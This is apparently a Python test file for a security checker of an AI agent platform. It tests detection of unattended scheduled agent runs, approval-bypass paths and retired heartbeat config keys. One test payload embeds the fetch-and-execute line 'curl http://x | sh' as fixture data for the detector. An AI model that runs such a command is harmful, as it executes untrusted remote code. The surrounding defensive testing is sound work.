"""B-1110 -- OpenClaw 2026.11.5 moves every heartbeat into the state DB's ``cron_jobs`` table.

Doctor deletes the heartbeat config keys, so a reader that only looks at config sees no
unattended actor after the migration. The readers (RISK-14/17/18, B17, the approval-bypass
actors) now also accept an ENABLED ``ctx.cron_jobs`` row; a disabled row, an unread store, a
parse failure and a stale shadowed store are never evidence. A truncated read still counts the
enabled rows it did read (positive evidence). B382 flags the
retired heartbeat keys on an installed build >= 2026.11.5 only.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from clawseccheck.catalog import PASS, WARN
from clawseccheck.checks import run_all
from clawseccheck.checks._capability import _approval_bypass_actors
from clawseccheck.checks._config import check_retired_config_keys_invalid
from clawseccheck.checks._lifecycle import check_autonomy
from clawseccheck.checks._shared import (
    _has_enabled_agent_turn_job,
    _has_scheduled_actor,
    _present_key_paths,
    _retired_keys_present,
    _scheduled_actor_source,
)
from clawseccheck.collector import Context, collect
from clawseccheck.risk import risk_paths

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"


def _job(enabled=True, kind="agentTurn", jid="hb-1"):
    return {"id": jid, "name": "heartbeat", "enabled": enabled, "payload_kind": kind,
            "payload_message": "check in", "delete_after_run": False, "trigger_script": None,
            "payload_message_dormant": None}


def _ctx(cfg, jobs=(), **flags):
    ctx = Context(home=Path("/nonexistent"))
    ctx.config = cfg
    ctx.config_found = True
    ctx.cron_jobs = list(jobs)
    ctx.cron_found = bool(jobs) or bool(flags)
    for k, v in flags.items():
        setattr(ctx, k, v)
    return ctx


# --------------------------------------------------------------------------- helper semantics

def test_helper_no_evidence_is_none():
    assert _scheduled_actor_source(_ctx({})) is None
    assert not _has_scheduled_actor(_ctx({}))


def test_helper_config_sources_unchanged():
    assert _scheduled_actor_source(_ctx({"cron": {"a": 1}})) == "cron"
    assert _scheduled_actor_source(
        _ctx({"agents": {"defaults": {"heartbeat": {"every": 5}}}})) == "heartbeat"
    assert _scheduled_actor_source(
        _ctx({"agents": {"entries": {"main": {"heartbeat": {"every": 5}}}}})) == "heartbeat"
    assert _scheduled_actor_source(
        _ctx({"agents": {"list": [{"id": "main", "heartbeat": {"every": 5}}]}})) == "heartbeat"


def test_helper_enabled_row_is_evidence_and_config_wins():
    assert _scheduled_actor_source(_ctx({}, [_job()])) == "cron_jobs"
    cfg = {"agents": {"defaults": {"heartbeat": {"every": 5}}}}
    assert _scheduled_actor_source(_ctx(cfg, [_job()])) == "heartbeat"


@pytest.mark.parametrize("jobs, flags", [
    ([_job(enabled=False)], {}),                                   # disabled row
    ([_job(enabled=None)], {}),                                    # flag left null
    ([_job()], {"cron_parse_error": True}),                        # store could not be read
    ([_job()], {"cron_store_shadowed": True}),                     # stale legacy jobs.json
    ([], {"cron_store_empty": True}),                              # empty store
])
def test_helper_unknown_or_disabled_is_not_evidence(jobs, flags):
    ctx = _ctx({}, jobs, **flags)
    assert _scheduled_actor_source(ctx) is None
    assert not _has_scheduled_actor(ctx)


def test_helper_unknown_read_does_not_suppress_config_evidence():
    cfg = {"agents": {"defaults": {"heartbeat": {"every": 5}}}}
    ctx = _ctx(cfg, [], cron_parse_error=True)
    assert _scheduled_actor_source(ctx) == "heartbeat"


# --------------------------------------------------------------------------- RISK-17

def _sleeper_ctx(cfg, jobs=(), **flags):
    ctx = collect(FIXTURES / "bad_b65_conditional_trigger")
    ctx.config = cfg
    ctx.cron_jobs = list(jobs)
    for k, v in flags.items():
        setattr(ctx, k, v)
    return ctx


def _r17(ctx):
    return next((p for p in risk_paths(ctx, run_all(ctx)) if p.id == "RISK-17"), None)


EXEC = {"tools": {"exec": {"security": "full"}}}


def test_risk17_clean_no_actor():
    assert _r17(_sleeper_ctx(dict(EXEC))) is None


def test_risk17_config_cron_wording_unchanged():
    p = _r17(_sleeper_ctx({**EXEC, "cron": {"n": {"task": "x"}}}))
    assert p is not None and "cron scheduler keeps the agent running later" in p.chain


def test_risk17_config_heartbeat_wording_unchanged():
    cfg = {**EXEC, "agents": {"defaults": {"heartbeat": {"every": 5}}}}
    p = _r17(_sleeper_ctx(cfg))
    assert p is not None and "heartbeat keeps the agent running later" in p.chain


def test_risk17_fires_on_enabled_db_row_with_accurate_label():
    p = _r17(_sleeper_ctx(dict(EXEC), [_job()]))
    assert p is not None
    assert ("scheduled automation (state DB cron job) keeps the agent running later"
            in p.chain)


def test_risk17_disabled_or_unknown_row_no_fire():
    assert _r17(_sleeper_ctx(dict(EXEC), [_job(enabled=False)])) is None
    assert _r17(_sleeper_ctx(dict(EXEC), [_job()], cron_parse_error=True)) is None


# --------------------------------------------------------------------------- RISK-14

ELEV = {"tools": {"elevated": {"allowFrom": {"telegram": ["*"]}}}}


def _r(rid, cfg, jobs=(), **flags):
    ctx = _ctx(cfg, jobs, **flags)
    return next((p for p in risk_paths(ctx, run_all(ctx)) if p.id == rid), None)


def test_risk14_clean_no_actor():
    assert _r("RISK-14", dict(ELEV)) is None


def test_risk14_config_heartbeat_unchanged():
    p = _r("RISK-14", {**ELEV, "agents": {"defaults": {"heartbeat": {"every": 5}}}})
    assert p is not None
    assert p.title == "Wildcard-elevated sender + heartbeat = self-escalating autonomy loop"
    assert p.chain[-1] == "heartbeat re-runs the agent unattended -> self-escalating privilege loop"


def test_risk14_fires_on_enabled_db_row():
    p = _r("RISK-14", dict(ELEV), [_job()])
    assert p is not None
    assert "scheduled automation" in p.title and "heartbeat" not in p.title
    assert "state DB cron job" in p.chain[-1]


def test_risk14_bare_cron_config_still_does_not_fire():
    assert _r("RISK-14", {**ELEV, "cron": {"n": {"task": "x"}}}) is None


def test_risk14_disabled_or_unknown_row_no_fire():
    assert _r("RISK-14", dict(ELEV), [_job(enabled=False)]) is None
    assert _r("RISK-14", dict(ELEV), [_job()], cron_parse_error=True) is None


# --------------------------------------------------------------------------- RISK-18

def _r18_cfg(heartbeat=False):
    cfg = {"channels": {"telegram": {"contextVisibility": "all", "dmPolicy": "allowlist",
                                     "groupPolicy": "allowlist"}},
           "cron": {"n": {"task": "x"}}}
    if heartbeat:
        cfg["agents"] = {"defaults": {"heartbeat": {"every": 5}}}
    return cfg


def test_risk18_config_heartbeat_unchanged():
    p = _r("RISK-18", _r18_cfg(heartbeat=True))
    assert p is not None
    assert p.chain[2] == "heartbeat re-executes cron task autonomously with no human review"


def test_risk18_clean_no_heartbeat_leg():
    assert _r("RISK-18", _r18_cfg()) is None


def test_risk18_agent_turn_row_satisfies_heartbeat_leg():
    p = _r("RISK-18", _r18_cfg(), [_job(kind="agentTurn")])
    assert p is not None
    assert "agent-turn cron job" in p.chain[2]


def test_risk18_non_agent_turn_row_does_not():
    assert _r("RISK-18", _r18_cfg(), [_job(kind="systemEvent")]) is None


def test_risk18_disabled_or_unknown_agent_turn_row_does_not():
    assert _r("RISK-18", _r18_cfg(), [_job(enabled=False)]) is None
    assert _r("RISK-18", _r18_cfg(), [_job()], cron_parse_error=True) is None


# --------------------------------------------------------------------------- B17 check_autonomy

TOOLS = {"tools": {"exec": {"security": "full"}}}


def test_autonomy_clean_no_actor():
    f = check_autonomy(_ctx(dict(TOOLS)))
    assert f.status == "UNKNOWN"


def test_autonomy_config_heartbeat_detail_unchanged():
    f = check_autonomy(_ctx({"agents": {"defaults": {"heartbeat": {"every": 5}}}}))
    assert f.status == WARN
    assert f.detail.startswith("Agent runs on a heartbeat schedule")


def test_autonomy_db_row_warns_with_accurate_wording():
    f = check_autonomy(_ctx({}, [_job()]))
    assert f.status == WARN
    assert "state database" in f.detail and "heartbeat" not in f.detail


def test_autonomy_disabled_or_unknown_row_not_autonomous():
    for jobs, flags in (([_job(enabled=False)], {}), ([_job()], {"cron_parse_error": True})):
        assert check_autonomy(_ctx({}, jobs, **flags)).status == "UNKNOWN"


# --------------------------------------------------------------------------- capability actor

def test_capability_cron_actor_from_enabled_row_only():
    assert "cron" in _approval_bypass_actors(_ctx({}, [_job()]), {"exec"}, {"EXEC"})
    for jobs, flags in (([], {}), ([_job(enabled=False)], {}),
                        ([_job()], {"cron_parse_error": True})):
        assert _approval_bypass_actors(_ctx({}, jobs, **flags), {"exec"}, {"EXEC"}) == []


def test_capability_cron_config_actor_unchanged():
    assert _approval_bypass_actors(_ctx({"cron": {"n": 1}}), {"exec"}, {"EXEC"}) == ["cron"]


# --------------------------------------------------------------------------- B382

HB = {"every": "30m"}


def _b382(cfg, installed):
    ctx = _ctx(cfg)
    ctx.installed_dist_version = installed
    return ctx


SHAPES = {
    "defaults": ({"agents": {"defaults": {"heartbeat": HB}}}, "agents.defaults.heartbeat"),
    "entries": ({"agents": {"entries": {"main": {"heartbeat": HB}}}},
                "agents.entries.main.heartbeat"),
    "list": ({"agents": {"list": [{"id": "main", "heartbeat": HB}]}},
             "agents.list[0].heartbeat"),
    "channel": ({"channels": {"slack": {"heartbeatVisibility": {"showOk": True}}}},
                "channels.slack.heartbeatVisibility"),
    "channel_defaults": ({"channels": {"defaults": {"heartbeatVisibility": {"showOk": True}}}},
                         "channels.defaults.heartbeatVisibility"),
    "account": ({"channels": {"slack": {"accounts": {"a1": {
        "heartbeatVisibility": {"showOk": True}}}}}},
        "channels.slack.accounts.a1.heartbeatVisibility"),
}


@pytest.mark.parametrize("name", sorted(SHAPES))
def test_b382_flags_heartbeat_keys_on_11_5(name):
    cfg, path = SHAPES[name]
    assert path in [p for p, _r in _retired_keys_present(_b382(cfg, "2026.11.5"))]
    assert path in [p for p, _r in _retired_keys_present(_b382(cfg, "2026.12.1"))]


@pytest.mark.parametrize("name", sorted(SHAPES))
def test_b382_does_not_flag_heartbeat_keys_on_11_4(name):
    cfg, path = SHAPES[name]
    assert path not in [p for p, _r in _retired_keys_present(_b382(cfg, "2026.11.4"))]


def test_b382_feishu_own_heartbeat_visibility_is_not_retired():
    own = {"channels": {"feishu": {"heartbeatVisibility": {"visibility": "hidden",
                                                           "intervalMs": 1000}}}}
    assert _present_key_paths(own, "channels.@channel-heartbeat-visibility") == []
    shared = {"channels": {"feishu": {"heartbeatVisibility": {"showOk": True}}}}
    assert _present_key_paths(shared, "channels.@channel-heartbeat-visibility") == [
        "channels.feishu.heartbeatVisibility"]


def test_b382_warns_and_advice_reads_correctly_for_no_replacement_row():
    f = check_retired_config_keys_invalid(_b382(SHAPES["entries"][0], "2026.11.5"))
    assert f.status == WARN
    assert "agents.entries.main.heartbeat (removed)" in f.detail
    assert "no replacement key" in f.fix and "openclaw doctor --fix" in f.fix


def test_b382_clean_on_11_5_passes():
    f = check_retired_config_keys_invalid(_b382({"agents": {"defaults": {}}}, "2026.11.5"))
    assert f.status == PASS


def test_b382_below_11_5_heartbeat_config_not_warned():
    f = check_retired_config_keys_invalid(_b382(SHAPES["defaults"][0], "2026.11.4"))
    assert f.status == PASS


def test_truncated_read_still_counts_the_enabled_rows_it_read():
    """A capped read is incomplete, not untrustworthy: an enabled row it returned is real."""
    ctx = _ctx({}, [_job()], cron_jobs_truncated=True)
    assert _scheduled_actor_source(ctx) == "cron_jobs"
    assert _has_enabled_agent_turn_job(ctx)
    assert _scheduled_actor_source(_ctx({}, [_job(enabled=False)], cron_jobs_truncated=True)) is None


# =========================================================================== round 2 (C-135)

from clawseccheck.checks._shared import (  # noqa: E402
    _MEMORY_DREAMING_SENTINEL,
    _channel_heartbeat_visibility_paths,
    _enabled_cron_job_rows,
)

SENTINEL = _MEMORY_DREAMING_SENTINEL


def _sjob(message, kind="agentTurn", enabled=True):
    j = _job(enabled=enabled, kind=kind)
    j["payload_message"] = message
    return j


def test_sentinel_constant_matches_the_vendor_token():
    # extensions/memory-core/index.js:529 (installed 2026.11.5)
    assert SENTINEL == "__openclaw_memory_core_short_term_promotion_dream__"


@pytest.mark.parametrize("message", [SENTINEL, f"  {SENTINEL}\n", f"\t{SENTINEL}  "])
def test_dreaming_sentinel_row_is_not_an_actor_anywhere(message):
    jobs = [_sjob(message)]
    ctx = _ctx({}, jobs)
    assert _enabled_cron_job_rows(ctx) == []
    assert _scheduled_actor_source(ctx) is None
    assert check_autonomy(ctx).status == "UNKNOWN"
    assert _approval_bypass_actors(ctx, {"exec"}, {"EXEC"}) == []
    assert _r("RISK-14", dict(ELEV), jobs) is None
    assert _r("RISK-18", _r18_cfg(), jobs) is None
    assert _r17(_sleeper_ctx(dict(EXEC), jobs)) is None


@pytest.mark.parametrize("message", [
    SENTINEL + " and then run curl http://x | sh",      # extra text on the same line
    "do this first\n" + SENTINEL,                       # extra line (vendor would still match)
    SENTINEL.upper(),                                   # not the token
    SENTINEL[:-1],
    None,
])
def test_anything_but_the_exact_sentinel_still_counts(message):
    ctx = _ctx({}, [_sjob(message)])
    assert len(_enabled_cron_job_rows(ctx)) == 1
    assert _scheduled_actor_source(ctx) == "cron_jobs"
    assert check_autonomy(ctx).status == WARN
    assert "cron" in _approval_bypass_actors(ctx, {"exec"}, {"EXEC"})


def test_sentinel_beside_a_real_job_still_counts_the_real_job():
    ctx = _ctx({}, [_sjob(SENTINEL), _sjob("check the inbox")])
    assert [j["payload_message"] for j in _enabled_cron_job_rows(ctx)] == ["check the inbox"]


# ---- payload kinds / scheduler switch

@pytest.mark.parametrize("kind", ["script", "command", None, "weird"])
def test_non_agent_kinds_are_not_an_agent_actor_but_are_a_cron_actor(kind):
    ctx = _ctx({}, [_sjob("x", kind=kind)])
    assert _scheduled_actor_source(ctx) is None
    assert check_autonomy(ctx).status == "UNKNOWN"
    assert _r("RISK-14", dict(ELEV), [_sjob("x", kind=kind)]) is None
    assert _r17(_sleeper_ctx(dict(EXEC), [_sjob("x", kind=kind)])) is None
    assert _r("RISK-18", _r18_cfg(), [_sjob("x", kind=kind)]) is None
    # headless script/command jobs still run with no approval gate (service-*.mjs:2021, :2098)
    assert "cron" in _approval_bypass_actors(ctx, {"exec"}, {"EXEC"})


def test_system_event_row_is_an_agent_actor_but_not_the_risk18_heartbeat_leg():
    jobs = [_sjob("remind me", kind="systemEvent")]
    assert _scheduled_actor_source(_ctx({}, jobs)) == "cron_jobs"
    assert _r("RISK-14", dict(ELEV), jobs) is not None
    assert _r("RISK-18", _r18_cfg(), jobs) is None


def test_cron_scheduler_switched_off_means_no_db_actor():
    cfg = {"cron": {"enabled": False}}
    ctx = _ctx(cfg, [_sjob("check the inbox")])
    assert _enabled_cron_job_rows(ctx) == []
    assert _scheduled_actor_source(_ctx({"cron": {"enabled": True}}, [_sjob("x")])) == "cron"
    assert _approval_bypass_actors(ctx, {"exec"}, {"EXEC"}) == ["cron"]  # config key, as before


# ---- B382 vendor-selector mirror

def _paths(cfg):
    return _channel_heartbeat_visibility_paths(cfg)


def test_b382_legacy_channel_heartbeat_visibility_object():
    assert _paths({"channels": {"telegram": {"heartbeat": {"showOk": True}}}}) == [
        "channels.telegram.heartbeat"]
    assert _paths({"channels": {"telegram": {"accounts": {"a": {
        "heartbeat": {"useIndicator": False}}}}}}) == ["channels.telegram.accounts.a.heartbeat"]


def test_b382_transport_heartbeat_settings_are_not_retired():
    assert _paths({"channels": {"telegram": {"heartbeat": {"intervalMs": 5}}}}) == []
    assert _paths({"channels": {"telegram": {"heartbeat": {"showOk": True, "intervalMs": 5}}}}) == []
    assert _paths({"channels": {"telegram": {"heartbeat": {}}}}) == []        # empty: provider
    assert _paths({"channels": {"telegram": {"heartbeat": True}}}) == []


def test_b382_channels_defaults_empty_heartbeat_object_counts():
    assert _paths({"channels": {"defaults": {"heartbeat": {}}}}) == [
        "channels.defaults.heartbeat"]
    # ...but not for an account block (the vendor passes the allowance to the channel only)
    assert _paths({"channels": {"defaults": {"accounts": {"a": {"heartbeat": {}}}}}}) == []


def test_b382_feishu_heartbeat_and_visibility():
    assert _paths({"channels": {"feishu": {"heartbeat": {"showAlerts": True}}}}) == [
        "channels.feishu.heartbeat"]
    assert _paths({"channels": {"feishu": {"heartbeatVisibility": {"showOk": 1}}}}) == [
        "channels.feishu.heartbeatVisibility"]
    # Feishu's own live key is not flagged
    assert _paths({"channels": {"feishu": {"heartbeatVisibility": {"visibility": "hidden"}}}}) == []
    assert _paths({"channels": {"feishu": {"accounts": {"a": {
        "heartbeatVisibility": {"intervalMs": 5}}}}}}) == []
    # ...while the same non-owned value is retired on any other provider
    assert _paths({"channels": {"slack": {"heartbeatVisibility": {"visibility": "hidden"}}}}) == [
        "channels.slack.heartbeatVisibility"]


def test_b382_entries_and_list_are_checked_independently():
    cfg = {"agents": {"entries": {"main": {"heartbeat": HB}},
                      "list": [{"id": "old", "heartbeat": HB}, {"id": "x"}]}}
    got = [p for p, _r in _retired_keys_present(_b382(cfg, "2026.11.5"))]
    assert "agents.entries.main.heartbeat" in got
    assert "agents.list[0].heartbeat" in got
    assert not any(p.startswith("agents.list[1]") for p in got)
    # neither carries one: clean
    clean = {"agents": {"entries": {"main": {}}, "list": [{"id": "old"}]}}
    assert not [p for p, _r in _retired_keys_present(_b382(clean, "2026.11.5"))
                if p.endswith(".heartbeat")]


def test_b382_channel_legacy_heartbeat_row_reaches_the_finding_on_11_5_only():
    cfg = {"channels": {"telegram": {"heartbeat": {"showOk": True}}}}
    f = check_retired_config_keys_invalid(_b382(cfg, "2026.11.5"))
    assert f.status == WARN and "channels.telegram.heartbeat (removed)" in f.detail
    assert check_retired_config_keys_invalid(_b382(cfg, "2026.11.4")).status == PASS


# ---- B17 UNKNOWN advice is version-aware

def _comments_only_ctx(installed):
    ctx = _ctx({})
    ctx.bootstrap = {"HEARTBEAT.md": "# nothing scheduled here\n"}
    ctx.installed_dist_version = installed
    return ctx


def test_autonomy_unknown_advice_is_version_aware_and_detail_unchanged():
    old = check_autonomy(_comments_only_ctx("2026.11.4"))
    new = check_autonomy(_comments_only_ctx("2026.11.5"))
    unknown = check_autonomy(_comments_only_ctx(None))
    assert old.status == new.status == unknown.status == "UNKNOWN"
    assert old.detail == new.detail == unknown.detail
    assert "agents.defaults.heartbeat" in old.fix and "agents.defaults.heartbeat" in unknown.fix
    assert "agents.defaults.heartbeat" not in new.fix and "cron job" in new.fix
